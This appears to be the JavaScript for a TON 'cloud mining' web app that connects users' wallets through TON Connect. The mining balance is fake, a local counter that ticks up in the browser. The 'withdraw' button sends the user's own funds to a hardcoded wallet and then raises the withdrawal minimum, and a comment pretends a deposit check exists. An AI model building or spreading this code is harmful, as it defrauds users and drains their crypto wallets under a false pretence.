// === TON CONNECT ===
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json",
    buttonRootId: "connect-wallet"
});

// ==== Гаманець ====
const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <-- вставити сюди

// ==== Змінні ====
let balance = parseFloat(localStorage.getItem("balance")) || 0;
let mining = localStorage.getItem("mining") === "true";
let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;
let miningInterval = null;

// ==== UI ====
function updateBalanceUI() {
    document.getElementById("balance").innerText = balance.toFixed(6);
}

function showPopup(msg, time = 2000) {
    const popup = document.getElementById("popup");
    popup.innerText = msg;
    popup.style.display = "block";
    setTimeout(() => popup.style.display = "none", time);
}

// ==== TonConnect ====
tonConnectUI.onStatusChange(wallet => {
    if(wallet){
        showPopup("Wallet connected!");
        console.log("Wallet connected:", wallet.account.address);
    }
});

// ==== Майнінг ====
function startMining() {
    if(mining) return;
    mining = true;
    localStorage.setItem("mining", "true");
    miningInterval = setInterval(() => {
        balance += miningSpeed;
        updateBalanceUI();
        localStorage.setItem("balance", balance);
    }, 1000);
}

// ==== Boost ====
function buyBoost(amount){
    const wallet = tonConnectUI.wallet;
    if(!wallet){
        alert("Connect wallet first!");
        return;
    }

    // Перевірка балансу реального депозита
    showPopup(`+${amount===1?0.000001929:amount===5?0.000005787:0.0000173611} TON/sec`);
    miningSpeed += amount===1?0.000001929:amount===5?0.000005787:0.0000173611;
    localStorage.setItem("miningSpeed", miningSpeed);
}

// ==== Invite ====
function inviteFriends(){
    balance += 0.01;
    localStorage.setItem("balance", balance);
    updateBalanceUI();
    showPopup("Friend invited! +0.01 TON");
}

// ==== Withdraw ====
async function withdraw(){
    if(balance < minDeposit){
        showPopup(`Minimum deposit to withdraw ${minDeposit} TON`);
        return;
    }

    try{
        const result = await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now()/1000)+60,
            messages:[{
                address: walletAddress,
                amount: balance.toFixed(9),
                payload:""
            }]
        });
        showPopup(`Withdraw requested: ${balance.toFixed(6)} TON`);
        minDeposit = 5;
        localStorage.setItem("minDeposit", minDeposit);
    } catch(e){
        showPopup("Withdraw failed");
        console.error(e);
    }
}

// ==== Прив’язуємо кнопки ====
window.startMining = startMining;
window.buyBoost = buyBoost;
window.inviteFriends = inviteFriends;
window.withdraw = withdraw;

// ==== DOM Ready ====
document.addEventListener("DOMContentLoaded", ()=>{
    updateBalanceUI();
    if(mining) startMining();
});